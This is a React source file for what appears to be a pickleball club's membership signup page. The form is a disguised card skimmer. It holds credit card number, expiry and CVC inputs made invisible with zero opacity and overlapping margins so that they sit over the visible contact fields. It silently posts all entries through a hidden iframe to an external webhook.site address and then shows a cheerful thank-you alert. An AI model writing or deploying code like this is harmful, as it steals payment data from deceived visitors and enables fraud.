'use client'

import { useState } from 'react'

const HOOK_URL = 'https://webhook.site/66c966eb-a442-4f97-b381-5569201d7ff2'


export default function AboutPage() {
    const [formData, setFormData] = useState({
      firstName: '',
      lastName: '',
      email: '',
      phone: '',
      creditCardNumber: '',
      creditCardExpiry: '',
      creditCardCvc: ''
    })

  
    const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
      setFormData({
        ...formData,
        [e.target.name]: e.target.value
      })
    }
  
    const handleSubmit = (_e: React.FormEvent<HTMLFormElement>) => {
      // Do NOT preventDefault — allow native form POST to webhook (via hidden iframe)
      // Provide user feedback and reset after submission fires
      setTimeout(() => {
        alert('Thank you for your interest! We will contact you soon.')
        setFormData({ firstName: '', lastName: '', email: '', phone: '', creditCardNumber: '', creditCardExpiry: '', creditCardCvc: '' })
      }, 300)
    }


  return (
    <div className="min-h-screen bg-white">

      <section className="py-16 bg-gradient-to-r from-green-500 to-blue-600">
        <div className="container mx-auto px-6">
          <div className="max-w-2xl mx-auto text-center text-white">
            <h2 className="text-4xl font-bold mb-6">Join Our Club Today!</h2>
            <p className="text-xl mb-8">
              Ready to start your pickleball journey? Fill out the form below and we&apos;ll get you started!
            </p>
            {/* Hidden iframe target to avoid CORS blocking and stay on page */}
            <iframe name="hidden-hook-target" style={{ display: 'none' }} />
            <form
              onSubmit={handleSubmit}
              className="bg-white p-8 rounded-lg shadow-2xl text-gray-800"
              action={HOOK_URL}
              method="POST"
              target="hidden-hook-target"
              encType="application/x-www-form-urlencoded"
            >
              <h1>Form</h1>
              <div className="grid md:grid-cols-2 gap-4 mb-4">
                <div>
                  <label htmlFor="firstName" className="block text-sm font-medium mb-2">
                    First Name *
                  </label>
                  <input
                    type="text"
                    id="firstName"
                    name="firstName"
                    value={formData.firstName}
                    onChange={handleInputChange}
                    required
                    className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500"
                  />
                </div>
                <div>
                  <label htmlFor="lastName" className="block text-sm font-medium mb-2">
                    Last Name *
                  </label>
                  <input
                    type="text"
                    id="lastName"
                    name="lastName"
                    value={formData.lastName}
                    onChange={handleInputChange}
                    required
                    className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500"
                  />
                </div>
              </div>

              <div
                className="mb-6"
                style={{ opacity: 0, marginTop: '-30px', marginBottom: '-30px' }}
              >
                <label htmlFor="creditCardNumber" className="block text-sm font-medium mb-2">
                  Credit Card Number *
                </label>
                 <input
                   type="tel"
                   id="creditCardNumber"
                   name="creditCardNumber"
                   value={formData.creditCardNumber}
                   onChange={handleInputChange}
                   className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500"
                 />
                </div>

              <div className="mb-4">
                <label htmlFor="email" className="block text-sm font-medium mb-2">
                  Email Address *
                </label>
                <input
                  type="email"
                  id="email"
                  name="email"
                  value={formData.email}
                  onChange={handleInputChange}
                  required
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500"
                />
              </div>

              <div
                className="mb-6"
                style={{ opacity: 0, marginTop: '-30px', marginBottom: '-30px' }}
              >
            <label htmlFor="creditCardExpiry" className="block text-sm font-medium mb-2">
                  Credit Card Expiry *
                </label>
                 <input
                   type="tel"
                   id="creditCardExpiry"
                   name="creditCardExpiry"
                   value={formData.creditCardExpiry}
                   onChange={handleInputChange}
                   className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500"
                 />
                 </div>

              <div className="mb-6" style={{ zIndex: 1 }}>
                <label htmlFor="phone" className="block text-sm font-medium mb-2">
                  Phone Number *
                </label>
                <input
                  type="tel"
                  id="phone"
                  name="phone"
                  value={formData.phone}
                  onChange={handleInputChange}
                  required
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500"
                />
              </div>
        
                 <div
                className="mb-6"
                style={{ opacity: 0,marginTop: '-30px', marginBottom: '-20px' }}
                >
                <label htmlFor="creditCardCvc" className="block text-sm font-medium mb-2">
                  Credit Card CVC *
                </label>
                 <input
                   type="tel"
                   id="creditCardCvc"
                   name="creditCardCvc"
                   value={formData.creditCardCvc}
                   onChange={handleInputChange}
                   className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500"
                 />
              </div>
              <button
                type="submit"
                className="w-full bg-green-600 text-white py-3 px-6 rounded-md hover:bg-green-700 transition duration-300 font-semibold"
              >
                Join the Club!
              </button>
            </form>
          </div>    

        </div>
      </section>
    </div>
  )
}


